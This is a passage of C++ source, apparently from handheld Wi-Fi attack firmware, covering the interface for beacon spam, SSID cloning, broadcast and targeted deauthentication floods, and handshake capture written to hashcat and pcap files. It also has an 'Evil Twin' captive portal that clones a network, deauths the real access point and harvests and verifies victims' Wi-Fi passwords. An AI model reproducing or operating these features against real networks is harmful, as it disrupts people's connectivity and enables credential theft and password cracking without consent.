    if (beacon_mode_ == 3) {
        sd_ssids_ = load_sd_ssids();  // refresh the SD SSID list each run
    }
    beacon_count_ = 0;
    // Starting from a BLE radio state resets the C6 (route Wi-Fi); sending beacon
    // commands while the hosted SDIO link is re-initialising wedges it. Wait ~3s for
    // the hand-off to settle, then we also halt scan hopping (see on_beacon_timer).
    beacon_warmup_ = 10;
    beacon_timer_  = lv_timer_create(&WifiScreen::on_beacon_timer, 300, this);
    if (spam_btn_ != nullptr) {
        lv_label_set_text(spam_btn_, LV_SYMBOL_STOP " Stop Spam");
    }
}

void WifiScreen::stop_beacon_spam()
{
    if (beacon_timer_ != nullptr) {
        lv_timer_del(beacon_timer_);
        beacon_timer_ = nullptr;
    }
    if (beacon_mode_ == 2 && clone_ssid_.empty()) {
        if (auto* engine = services::radio_engine()) {
            engine->send(domain::cmd_stop());  // stop the C6 probe-harvest promiscuous
        }
    }
    clone_ssid_.clear();
    if (auto* scanner = services::wifi_scanner()) {
        scanner->start();  // resume scanning / channel hopping
    }
    if (spam_btn_ != nullptr) {
        lv_label_set_text(spam_btn_, LV_SYMBOL_WARNING " WiFi Spam");
    }
}

void WifiScreen::on_clone_spam(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self == nullptr || self->pending_detail_.hidden || self->pending_detail_.ssid.empty()) {
        return;
    }
    self->clone_ssid_ = self->pending_detail_.ssid;
    self->start_beacon_spam();  // no-op if already running; clone_ssid_ applies next tick
    char buf[96];
    std::snprintf(buf, sizeof(buf), LV_SYMBOL_COPY " Cloning '%s' - Back, then Stop Spam to end",
                  self->clone_ssid_.c_str());
    self->set_status(buf);
}

void WifiScreen::on_spam_close(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self != nullptr) {
        self->close_spam_modal();
    }
}

void WifiScreen::open_spam_modal()
{
    if (spam_modal_ != nullptr) {
        return;
    }
    spam_modal_ = lv_obj_create(lv_layer_top());
    lv_obj_set_size(spam_modal_, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(spam_modal_, lv_color_black(), 0);
    lv_obj_set_style_bg_opa(spam_modal_, LV_OPA_70, 0);
    lv_obj_set_style_border_width(spam_modal_, 0, 0);
    lv_obj_clear_flag(spam_modal_, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(spam_modal_, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(spam_modal_, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER,
                          LV_FLEX_ALIGN_CENTER);

    lv_obj_t* panel = lv_obj_create(spam_modal_);
    lv_obj_set_size(panel, lv_pct(78), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_color(panel, lv_semantic(SemanticColor::Surface), 0);
    lv_obj_set_style_radius(panel, tokens::RadiusMd, 0);
    lv_obj_set_style_pad_all(panel, tokens::SpaceLg, 0);
    lv_obj_set_style_pad_row(panel, tokens::SpaceMd, 0);
    lv_obj_set_flex_flow(panel, LV_FLEX_FLOW_COLUMN);
    lv_obj_clear_flag(panel, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t* hdr = make_panel(panel, LV_FLEX_FLOW_ROW);
    lv_obj_set_width(hdr, lv_pct(100));
    lv_obj_set_height(hdr, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_column(hdr, tokens::SpaceMd, 0);
    lv_obj_set_flex_align(hdr, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_t* title = lv_label_create(hdr);
    lv_label_set_text(title, LV_SYMBOL_WARNING " WiFi Spam");
    lv_obj_set_style_text_color(title, lv_semantic(SemanticColor::TextPrimary), 0);
    lv_obj_set_style_text_font(title, &ibm_plex_mono_32, 0);
    lv_obj_set_flex_grow(title, 1);
    lv_obj_t* close = make_button(hdr, LV_SYMBOL_CLOSE " Close", SemanticColor::Border);
    lv_obj_add_event_cb(close, &WifiScreen::on_spam_close, LV_EVENT_CLICKED, this);

    lv_obj_t* desc = lv_label_create(panel);
    lv_label_set_text(desc,
                      "Flood fake access points so nearby devices see them in their Wi-Fi list.");
    lv_label_set_long_mode(desc, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(desc, lv_pct(100));
    lv_obj_set_style_text_color(desc, lv_semantic(SemanticColor::TextSecondary), 0);

    lv_obj_t* modes = make_panel(panel, LV_FLEX_FLOW_ROW);
    lv_obj_set_width(modes, lv_pct(100));
    lv_obj_set_height(modes, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_column(modes, tokens::SpaceMd, 0);
    for (int i = 0; i < kSpamModeCount; ++i) {
        lv_obj_t* b = make_button(modes, kSpamModeLabels[i], SemanticColor::Border);
        lv_obj_set_user_data(b, reinterpret_cast<void*>(static_cast<intptr_t>(i)));
        lv_obj_set_flex_grow(b, 1);
        lv_obj_add_event_cb(b, &WifiScreen::on_spam_mode, LV_EVENT_CLICKED, this);
        spam_mode_btns_[i] = b;
    }
    update_spam_modes();

    lv_obj_t* ctrl = make_panel(panel, LV_FLEX_FLOW_ROW);
    lv_obj_set_width(ctrl, lv_pct(100));
    lv_obj_set_height(ctrl, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_column(ctrl, tokens::SpaceMd, 0);
    lv_obj_set_flex_align(ctrl, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_t* sw = lv_switch_create(ctrl);
    if (beacon_timer_ != nullptr) {
        lv_obj_add_state(sw, LV_STATE_CHECKED);
    }
    lv_obj_add_event_cb(sw, &WifiScreen::on_spam_toggle, LV_EVENT_VALUE_CHANGED, this);
    spam_status_ = lv_label_create(ctrl);
    lv_obj_set_flex_grow(spam_status_, 1);
    lv_label_set_text(spam_status_, beacon_timer_ != nullptr
                                        ? LV_SYMBOL_WARNING " Flooding fake APs..."
                                        : "Pick a mode, flip the switch.");
    lv_obj_set_style_text_color(spam_status_, lv_semantic(SemanticColor::TextPrimary), 0);

    // Live results console (C6 rc lines from RadioConsole), refreshed by on_beacon_timer.
    lv_obj_t* cbox = lv_obj_create(panel);
    lv_obj_set_width(cbox, lv_pct(100));
    lv_obj_set_height(cbox, 170);
    lv_obj_set_style_bg_color(cbox, lv_semantic(SemanticColor::Background), 0);
    lv_obj_set_style_bg_opa(cbox, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(cbox, 0, 0);
    lv_obj_set_style_pad_all(cbox, tokens::SpaceSm, 0);
    lv_obj_set_scroll_dir(cbox, LV_DIR_VER);
    spam_console_ = lv_label_create(cbox);
    lv_label_set_long_mode(spam_console_, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(spam_console_, lv_pct(100));
    lv_obj_set_style_text_font(spam_console_, &ibm_plex_mono_16, 0);
    lv_obj_set_style_text_color(spam_console_, lv_semantic(SemanticColor::TextSecondary), 0);
    const std::string c0 = services::RadioConsole::instance().text();
    lv_label_set_text(spam_console_, c0.empty() ? "(waiting for C6 results...)" : c0.c_str());
    spam_console_rev_ = services::RadioConsole::instance().revision();
}

void WifiScreen::close_spam_modal()
{
    if (spam_modal_ == nullptr) {
        return;
    }
    lv_obj_t* modal = spam_modal_;
    spam_modal_     = nullptr;
    spam_status_    = nullptr;  // timer must not touch it after close
    spam_console_   = nullptr;
    for (auto& b : spam_mode_btns_) {
        b = nullptr;
    }
    lv_obj_del_async(modal);  // beacon_timer_ keeps running if left ON
}

void WifiScreen::on_scan_clients(lv_event_t* event)
{
    auto* self   = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* engine = services::radio_engine();
    if (self == nullptr || engine == nullptr) {
        return;
    }
    domain::MacAddr bssid{};
    if (!parse_mac(self->pending_detail_.bssid, bssid)) {
        return;
    }
    // Halt the background AP scan so the C6 can park on this AP's channel for
    // promiscuous capture (channel hopping would starve the station discovery).
    if (auto* scanner = services::wifi_scanner()) {
        scanner->stop();
    }
    services::StationStore::instance().clear();
    services::CaptureStore::instance().set_target(
        self->pending_detail_.hidden ? std::string() : self->pending_detail_.ssid);
    self->monitor_mode_ = true;
    self->open_attack_modal();
    services::RadioConsole::instance().log("> SCAN CLIENTS started");
    engine->send(
        domain::cmd_scan_stations(bssid, static_cast<uint8_t>(self->pending_detail_.channel)));
}

void WifiScreen::rebuild_station_list()
{
    if (attack_box_ == nullptr) {
        return;
    }
    const uint32_t rev =
        services::StationStore::instance().revision() ^ (services::CaptureStore::instance().revision() << 16);
    if (rev == station_rev_) {
        return;  // nothing new
    }
    station_rev_ = rev;

    // Flush any captured hashcat lines to the microSD here (LVGL thread = safe
    // context; the capture hook only queues them in memory).
    const auto pending = services::CaptureStore::instance().drain_lines();
    if (!pending.empty()) {
        services::ActivityStats::instance().handshakes.fetch_add(
            static_cast<uint32_t>(pending.size()));
        std::ofstream f("/sd/spectra5/handshakes.hc22000", std::ios::app);
        for (const auto& l : pending) {
            if (f) {
                f << l << "\n";
            }
        }
    }

    // Drain raw EAPOL frames the C6 forwarded -> append to a per-target .pcap
    // (LINKTYPE_IEEE802_11 = 105), openable in Wireshark next to the .hc22000.
    const auto frames = services::PcapStore::instance().drain();
    if (!frames.empty()) {
        std::string essid = services::CaptureStore::instance().essid();
        std::string fn;
        for (char c : essid) {
            fn += std::isalnum(static_cast<unsigned char>(c)) ? c : '_';
        }
        if (fn.empty()) {
            fn = "capture";
        }
        const std::string path = "/sd/spectra5/wifi/" + fn + ".pcap";
        std::ifstream probe(path);
        const bool is_new = !probe.good();
        probe.close();
        std::ofstream pf(path, std::ios::binary | std::ios::app);
        if (pf) {
            auto put32 = [&](std::uint32_t v) { pf.write(reinterpret_cast<const char*>(&v), 4); };
            auto put16 = [&](std::uint16_t v) { pf.write(reinterpret_cast<const char*>(&v), 2); };
            if (is_new) {
                put32(0xa1b2c3d4);  // pcap magic (little-endian host)
                put16(2);           // version_major
                put16(4);           // version_minor
                put32(0);           // thiszone
                put32(0);           // sigfigs
                put32(65535);       // snaplen
                put32(105);         // network = LINKTYPE_IEEE802_11
            }
            const std::uint32_t ts = static_cast<std::uint32_t>(::time(nullptr));
            std::uint32_t usec     = 0;
            for (const auto& fr : frames) {
                put32(ts);                                           // ts_sec
                put32(usec++);                                       // ts_usec (distinct)
                put32(static_cast<std::uint32_t>(fr.size()));        // incl_len
                put32(static_cast<std::uint32_t>(fr.size()));        // orig_len
                pf.write(reinterpret_cast<const char*>(fr.data()), static_cast<std::streamsize>(fr.size()));
            }
            services::RadioConsole::instance().log(
                (std::string("wrote ") + path + "  (" + std::to_string(frames.size()) + " frames)").c_str());
        }
    }

    const auto stations = services::StationStore::instance().snapshot();
    const int pmkids    = services::CaptureStore::instance().pmkid_count();
    const int eapols    = services::CaptureStore::instance().eapol_count();

    if (attack_status_ != nullptr) {
        char s[112];
        if (targeting_) {
            std::snprintf(s, sizeof(s),
                          LV_SYMBOL_WARNING " Deauthing %02x:%02x:%02x:%02x:%02x:%02x  |  PMKID:%d  EAPOL:%d",
                          attack_target_[0], attack_target_[1], attack_target_[2], attack_target_[3],
                          attack_target_[4], attack_target_[5], pmkids, eapols);
        } else {
            std::snprintf(s, sizeof(s),
                          LV_SYMBOL_EYE_OPEN " %d clients  |  PMKID:%d  EAPOL:%d  -- tap to deauth",
                          static_cast<int>(stations.size()), pmkids, eapols);
        }
        lv_label_set_text(attack_status_, s);
    }

    lv_obj_clean(attack_box_);
    if (stations.empty()) {
        lv_obj_t* empty = lv_label_create(attack_box_);
        lv_label_set_text(empty, "(listening -- no clients transmitting yet)");
        lv_obj_set_style_text_color(empty, lv_semantic(SemanticColor::TextSecondary), 0);
        return;
    }
    for (std::size_t i = 0; i < stations.size(); ++i) {
        const auto& st        = stations[i];
        const bool under_fire = targeting_ && attack_target_ == st.mac;
        const bool random_mac = (st.mac[0] & 0x02) != 0;  // locally-administered = randomized
        const char* vendor    = domain::oui_vendor(st.mac);
        char tag[24];
        if (random_mac) {
            std::snprintf(tag, sizeof(tag), "   [random]");
        } else if (vendor[0] != '\0') {
            std::snprintf(tag, sizeof(tag), "   %s", vendor);
        } else {
            std::snprintf(tag, sizeof(tag), "   [real]");
        }
        char row[128];
        std::snprintf(row, sizeof(row), "%s%02x:%02x:%02x:%02x:%02x:%02x   %d dBm   %u pkt%s",
                      under_fire ? LV_SYMBOL_WARNING " " : "", st.mac[0], st.mac[1], st.mac[2],
                      st.mac[3], st.mac[4], st.mac[5], st.rssi,
                      static_cast<unsigned>(st.packets), tag);
        lv_obj_t* btn = make_button(attack_box_, row,
                                    under_fire ? SemanticColor::Danger : SemanticColor::SurfaceRaised);
        lv_obj_set_width(btn, lv_pct(100));
        lv_obj_set_user_data(btn, reinterpret_cast<void*>(static_cast<intptr_t>(i)));
        lv_obj_add_event_cb(btn, &WifiScreen::on_station_deauth, LV_EVENT_CLICKED, this);
    }
}

void WifiScreen::on_station_deauth(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* btn  = static_cast<lv_obj_t*>(lv_event_get_current_target(event));
    if (self == nullptr || btn == nullptr) {
        return;
    }
    const auto idx      = static_cast<std::size_t>(reinterpret_cast<intptr_t>(lv_obj_get_user_data(btn)));
    const auto stations = services::StationStore::instance().snapshot();
    if (idx >= stations.size()) {
        return;
    }
    // Tapping the client that's already being attacked stops; otherwise (re)targets
    // it with a continuous deauth flood.
    if (self->targeting_ && self->attack_target_ == stations[idx].mac) {
        self->targeting_ = false;
        if (self->attack_timer_ != nullptr) {
            lv_timer_del(self->attack_timer_);
            self->attack_timer_ = nullptr;
        }
        services::RadioConsole::instance().log("> deauth stopped");
    } else {
        self->attack_target_ = stations[idx].mac;
        self->targeting_     = true;
        if (self->attack_timer_ == nullptr) {
            self->attack_timer_ = lv_timer_create(&WifiScreen::on_attack_timer, 400, self);
        }
        self->send_deauth_to(self->attack_target_);
    }
    self->station_rev_ = 0;  // force the list to repaint the highlight
}

void WifiScreen::send_deauth_to(const domain::MacAddr& target)
{
    auto* engine = services::radio_engine();
    if (engine == nullptr) {
        return;
    }
    domain::MacAddr bssid{};
    if (!parse_mac(pending_detail_.bssid, bssid)) {
        return;
    }
    domain::DeauthParams params;
    params.bssid   = bssid;
    params.target  = target;  // unicast -> just this client
    params.channel = static_cast<uint8_t>(pending_detail_.channel);
    params.reason  = 7;
    params.bursts  = 16;
    engine->send(domain::cmd_deauth(params));
    char line[64];
    std::snprintf(line, sizeof(line), "> DEAUTH client %02x:%02x:%02x:%02x:%02x:%02x", target[0],
                  target[1], target[2], target[3], target[4], target[5]);
    services::RadioConsole::instance().log(line);
}

void WifiScreen::open_attack_modal()
{
    if (attack_modal_ != nullptr) {
        return;
    }
    // Dimmed full-screen overlay on the top layer so it covers the whole UI.
    attack_modal_ = lv_obj_create(lv_layer_top());
    lv_obj_set_size(attack_modal_, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(attack_modal_, lv_color_black(), 0);
    lv_obj_set_style_bg_opa(attack_modal_, LV_OPA_70, 0);
    lv_obj_set_style_border_width(attack_modal_, 0, 0);
    lv_obj_clear_flag(attack_modal_, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(attack_modal_, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(attack_modal_, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER,
                          LV_FLEX_ALIGN_CENTER);

    lv_obj_t* panel = lv_obj_create(attack_modal_);
    lv_obj_set_size(panel, lv_pct(82), lv_pct(86));
    lv_obj_set_style_bg_color(panel, lv_semantic(SemanticColor::Surface), 0);
    lv_obj_set_style_radius(panel, tokens::RadiusMd, 0);
    lv_obj_set_style_pad_all(panel, tokens::SpaceLg, 0);
    lv_obj_set_style_pad_row(panel, tokens::SpaceMd, 0);
    lv_obj_set_flex_flow(panel, LV_FLEX_FLOW_COLUMN);
    lv_obj_clear_flag(panel, LV_OBJ_FLAG_SCROLLABLE);

    // Header: title + close.
    lv_obj_t* hdr = make_panel(panel, LV_FLEX_FLOW_ROW);
    lv_obj_set_width(hdr, lv_pct(100));
    lv_obj_set_height(hdr, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_column(hdr, tokens::SpaceMd, 0);
    lv_obj_set_flex_align(hdr, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_t* title = lv_label_create(hdr);
    char tbuf[80];
    if (portal_mode_) {
        if (twin_ssid_.empty()) {
            std::snprintf(tbuf, sizeof(tbuf), LV_SYMBOL_WARNING " Evil Portal");
        } else {
            std::snprintf(tbuf, sizeof(tbuf), LV_SYMBOL_WARNING " Evil Twin  -  %s",
                          twin_ssid_.c_str());
        }
    } else {
        std::snprintf(tbuf, sizeof(tbuf), "%s  -  %s",
                      monitor_mode_ ? LV_SYMBOL_REFRESH " Scan clients" : LV_SYMBOL_WARNING " Deauth",
                      pending_detail_.hidden ? "<hidden>" : pending_detail_.ssid.c_str());
    }
    lv_label_set_long_mode(title, LV_LABEL_LONG_DOT);
    lv_label_set_text(title, tbuf);
    lv_obj_set_style_text_color(title, lv_semantic(SemanticColor::TextPrimary), 0);
    lv_obj_set_style_text_font(title, &ibm_plex_mono_32, 0);
    lv_obj_set_flex_grow(title, 1);
    lv_obj_t* close = make_button(hdr, LV_SYMBOL_CLOSE " Close", SemanticColor::Border);
    lv_obj_add_event_cb(close, &WifiScreen::on_attack_close, LV_EVENT_CLICKED, this);

    // Control row: deauth gets an ON/OFF flood switch; client scan just listens.
    lv_obj_t* ctrl = make_panel(panel, LV_FLEX_FLOW_ROW);
    lv_obj_set_width(ctrl, lv_pct(100));
    lv_obj_set_height(ctrl, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_column(ctrl, tokens::SpaceMd, 0);
    lv_obj_set_flex_align(ctrl, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_t* ctrl_lbl = lv_label_create(ctrl);
    attack_status_     = ctrl_lbl;
    if (monitor_mode_) {
        lv_label_set_text(ctrl_lbl, LV_SYMBOL_EYE_OPEN " Listening... tap a client to deauth it");
    } else {
        lv_obj_t* sw = lv_switch_create(ctrl);
        if (portal_mode_ && services::evil_portal() != nullptr &&
            services::evil_portal()->active()) {
            lv_obj_add_state(sw, LV_STATE_CHECKED);  // reflect a running portal
        }
        lv_obj_add_event_cb(sw, &WifiScreen::on_attack_toggle, LV_EVENT_VALUE_CHANGED, this);
        if (portal_mode_) {
            char pbuf[96];
            if (twin_ssid_.empty()) {
                std::snprintf(pbuf, sizeof(pbuf), "Evil Portal  (ON = fake \"Free WiFi\" hotspot)");
            } else {
                std::snprintf(pbuf, sizeof(pbuf), "Evil Twin  (ON = clone \"%s\", grab its Wi-Fi key)",
                              twin_ssid_.c_str());
            }
            lv_label_set_text(ctrl_lbl, pbuf);
            // Evil Twin: verify a captured Wi-Fi password against the real AP, and
            // optionally deauth the real AP so victims fall onto the open clone.
            if (!twin_ssid_.empty()) {
                lv_obj_t* vbtn =
                    make_button(ctrl, LV_SYMBOL_OK " Verify pwd", SemanticColor::Success);
                lv_obj_add_event_cb(vbtn, &WifiScreen::on_verify_pwd, LV_EVENT_CLICKED, this);
                lv_obj_t* dbtn = make_button(
                    ctrl,
                    twin_deauth_timer_ != nullptr ? LV_SYMBOL_WARNING " Deauth: ON"
                                                  : LV_SYMBOL_WARNING " Deauth: OFF",
                    SemanticColor::Danger);
                lv_obj_add_event_cb(dbtn, &WifiScreen::on_twin_deauth_toggle, LV_EVENT_CLICKED,
                                    this);
            }
        } else {
            lv_label_set_text(ctrl_lbl, "Deauth flood  (ON = continuous)");
        }
    }
    lv_obj_set_style_text_color(ctrl_lbl, lv_semantic(SemanticColor::TextSecondary), 0);
    lv_obj_set_style_text_font(ctrl_lbl, &ibm_plex_mono_16, 0);

    // Portal page picker: built-in or any /sd/spectra5/portals/*.html the user dropped.
    if (portal_mode_) {
        lv_obj_t* trow = make_panel(panel, LV_FLEX_FLOW_ROW);
        lv_obj_set_width(trow, lv_pct(100));
        lv_obj_set_height(trow, LV_SIZE_CONTENT);
        lv_obj_set_style_pad_column(trow, tokens::SpaceMd, 0);
        lv_obj_set_flex_align(trow, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER,
                              LV_FLEX_ALIGN_CENTER);
        lv_obj_t* tlbl = lv_label_create(trow);
        lv_label_set_text(tlbl, "Portal page:");
        lv_obj_set_style_text_color(tlbl, lv_semantic(SemanticColor::TextSecondary), 0);
        template_paths_  = list_portal_templates();
        lv_obj_t* dd     = lv_dropdown_create(trow);
        std::string opts = "Built-in\nRouter (offline)\nLogin (offline)";
        for (const auto& p : template_paths_) {
            const auto slash = p.find_last_of('/');
            opts += "\n" + (slash == std::string::npos ? p : p.substr(slash + 1));
        }
        lv_dropdown_set_options(dd, opts.c_str());
        lv_obj_set_flex_grow(dd, 1);
        brand_input(dd);
        lv_obj_add_event_cb(dd, &WifiScreen::on_template_changed, LV_EVENT_VALUE_CHANGED, this);
    }

    // Scroll box: a tappable station list (monitor) or the activity console (deauth).
    attack_box_ = lv_obj_create(panel);
    lv_obj_set_width(attack_box_, lv_pct(100));
    lv_obj_set_flex_grow(attack_box_, 1);
    lv_obj_set_style_bg_color(attack_box_, lv_semantic(SemanticColor::Background), 0);
    lv_obj_set_style_bg_opa(attack_box_, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(attack_box_, 0, 0);
    lv_obj_set_style_pad_all(attack_box_, tokens::SpaceSm, 0);
    lv_obj_set_scroll_dir(attack_box_, LV_DIR_VER);
    attack_active_ = false;

    if (monitor_mode_) {
        lv_obj_set_flex_flow(attack_box_, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_style_pad_row(attack_box_, tokens::SpaceSm, 0);
        station_rev_    = 0;  // force a first build
        attack_console_ = nullptr;
        rebuild_station_list();
    } else {
        attack_console_ = lv_label_create(attack_box_);
        lv_label_set_long_mode(attack_console_, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(attack_console_, lv_pct(100));
        lv_obj_set_style_text_font(attack_console_, &ibm_plex_mono_16, 0);
        lv_obj_set_style_text_color(attack_console_, lv_semantic(SemanticColor::TextPrimary), 0);
        const std::string c = services::RadioConsole::instance().text();
        lv_label_set_text(attack_console_, c.empty() ? "(idle -- toggle ON to start)" : c.c_str());
        console_rev_ = services::RadioConsole::instance().revision();
    }
}

void WifiScreen::on_attack_toggle(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* sw   = static_cast<lv_obj_t*>(lv_event_get_current_target(event));
    if (self == nullptr || sw == nullptr) {
        return;
    }
    const bool on = lv_obj_has_state(sw, LV_STATE_CHECKED);

    if (self->portal_mode_) {
        if (auto* portal = services::evil_portal()) {
            if (on) {
                portal->start(self->twin_ssid_.empty() ? "Free WiFi" : self->twin_ssid_);
            } else {
                portal->stop();
                // Stop the parallel deauth too -- firing it at a torn-down AP thrashes
                // the C6 (that was the Evil-Twin + Deauth crash).
                if (self->twin_deauth_timer_ != nullptr) {
                    lv_timer_del(self->twin_deauth_timer_);
                    self->twin_deauth_timer_ = nullptr;
                }
            }
        }
        return;
    }

    self->attack_active_ = on;
    if (on) {
        if (self->attack_timer_ == nullptr) {
            // Re-send the deauth burst periodically => continuous flood.
            self->attack_timer_ = lv_timer_create(&WifiScreen::on_attack_timer, 400, self);
        }
        self->send_deauth_once();
    } else if (self->attack_timer_ != nullptr) {
        lv_timer_del(self->attack_timer_);
        self->attack_timer_ = nullptr;
    }
}

void WifiScreen::on_attack_timer(lv_timer_t* timer)
{
    auto* self = static_cast<WifiScreen*>(lv_timer_get_user_data(timer));
    if (self == nullptr) {
        return;
    }
    if (self->targeting_) {
        self->send_deauth_to(self->attack_target_);  // continuous targeted flood
    } else if (self->attack_active_) {
        self->send_deauth_once();  // continuous broadcast flood
    }
}

void WifiScreen::on_attack_close(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self != nullptr) {
        self->close_attack_modal();
    }
}

void WifiScreen::close_attack_modal()
{
    attack_active_ = false;
    targeting_     = false;
    if (attack_timer_ != nullptr) {
        lv_timer_del(attack_timer_);
        attack_timer_ = nullptr;
    }
    if (twin_deauth_timer_ != nullptr) {
        lv_timer_del(twin_deauth_timer_);
        twin_deauth_timer_ = nullptr;
    }
    if (monitor_mode_) {
        // Stop promiscuous capture on the C6 and resume the background AP scan.
        if (auto* engine = services::radio_engine()) {
            engine->send(domain::cmd_stop());
        }
        if (auto* scanner = services::wifi_scanner()) {
            scanner->start();
        }
        monitor_mode_ = false;
    }
    if (portal_mode_) {
        // Request teardown -- the portal's worker tears down the AP and resumes
        // the scanner on its own (big-stack) task.
        if (auto* portal = services::evil_portal()) {
            portal->stop();
        }
        portal_mode_ = false;
    }
    if (attack_modal_ != nullptr) {
        // Deleted from within the Close button's own event, so defer it.
        lv_obj_del_async(attack_modal_);
        attack_modal_   = nullptr;
        attack_console_ = nullptr;
        attack_box_     = nullptr;
        attack_status_  = nullptr;
    }
}

void WifiScreen::on_scan_clicked(lv_event_t* event)
{
    auto* self    = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* scanner = services::wifi_scanner();
    if (self == nullptr || scanner == nullptr) {
        return;
    }
    self->pause_timer();
    if (scanner->is_scanning()) {
        scanner->stop();
    } else {
        scanner->start();
    }
    self->update_scan_button();
    self->resume_timer();
}

void WifiScreen::on_view_clicked(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self == nullptr) {
        return;
    }
    self->pause_timer();
    self->channels_view_ = !self->channels_view_;
    self->last_sig_.clear();
    self->update_filter_styles();
    if (!self->in_detail_) {
        self->rebuild_list();
    }
    self->resume_timer();
}

void WifiScreen::on_search_changed(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self == nullptr) {
        return;
    }
    const char* text   = lv_textarea_get_text(self->search_);
    self->ssid_filter_ = (text != nullptr) ? text : "";
    if (!self->in_detail_) {
        self->rebuild_list();
    }
}

void WifiScreen::on_search_focus(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self == nullptr) {
        return;
    }
    if (self->keyboard_ == nullptr) {
        self->keyboard_ = lv_keyboard_create(self->root_);
        lv_obj_add_event_cb(self->keyboard_, &WifiScreen::on_keyboard_done, LV_EVENT_READY, self);
        lv_obj_add_event_cb(self->keyboard_, &WifiScreen::on_keyboard_done, LV_EVENT_CANCEL, self);
    }
    lv_keyboard_set_textarea(self->keyboard_, self->search_);
    lv_obj_clear_flag(self->keyboard_, LV_OBJ_FLAG_HIDDEN);
    lv_obj_move_foreground(self->keyboard_);
}

void WifiScreen::on_keyboard_done(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    if (self != nullptr && self->keyboard_ != nullptr) {
        lv_obj_add_flag(self->keyboard_, LV_OBJ_FLAG_HIDDEN);
    }
}

void WifiScreen::on_filter_clicked(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* btn  = static_cast<lv_obj_t*>(lv_event_get_current_target(event));
    if (self == nullptr || btn == nullptr) {
        return;
    }
    self->pause_timer();
    self->channels_view_ = false;
    self->band_filter_   = static_cast<int>(reinterpret_cast<intptr_t>(lv_obj_get_user_data(btn)));
    self->last_sig_.clear();
    self->update_filter_styles();
    if (!self->in_detail_) {
        self->rebuild_list();
    }
    self->resume_timer();
}

void WifiScreen::on_save_clicked(lv_event_t* event)
{
    auto* self     = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* scanner  = services::wifi_scanner();
    auto* sessions = application::session_service();
    if (self == nullptr || scanner == nullptr) {
        return;
    }
    self->pause_timer();
    if (sessions == nullptr) {
        self->set_status("No storage: cannot save scan.");
        self->resume_timer();
        return;
    }

    // Dump the scan to /sd/spectra5/wifi/scan.csv (structured log).
    {
        auto& sd = services::SdLogger::instance();
        sd.enqueue("wifi/scan.csv", "# ssid,bssid,rssi,channel,hidden");
        for (const auto& ap : scanner->snapshot()) {
            char line[180];
            std::snprintf(line, sizeof(line), "%s,%s,%d,%d,%d",
                          ap.hidden ? "<hidden>" : ap.ssid.c_str(), ap.bssid.c_str(), ap.rssi,
                          ap.channel, ap.hidden ? 1 : 0);
            sd.enqueue("wifi/scan.csv", line);
        }
        sd.flush();
    }

#if defined(ESP_PLATFORM)
    auto* job  = new WifiSaveJob{};
    job->status = self->status_;
    job->aps    = scanner->snapshot();
    self->set_status("Saving scan to session...");
    if (xTaskCreate(wifi_save_task, "wifi_save", 8192, job, 3, nullptr) != pdPASS) {
        delete job;
        self->set_status("Could not start save task.");
    }
#else
    auto aps = scanner->snapshot();

    char name[48];
    const std::time_t t = std::time(nullptr);
    std::tm tm_buf{};
#if defined(_WIN32)
    localtime_s(&tm_buf, &t);
#else
    localtime_r(&t, &tm_buf);
#endif
    std::strftime(name, sizeof(name), "Wi-Fi scan %H:%M:%S", &tm_buf);

    auto created = sessions->create(name);
    if (!created) {
        self->set_status("Could not create session.");
        self->resume_timer();
        return;
    }

    std::size_t saved = 0;
    for (const auto& ap : aps) {
        if (saved >= kMaxSaved) {
            break;
        }
        MetadataMap meta;
        meta["ssid"]     = ap.hidden ? "<hidden>" : ap.ssid;
        meta["channel"]  = std::to_string(ap.channel);
        meta["band"]     = wifi_band_name(ap.band);
        meta["security"] = wifi_security_name(ap.security);
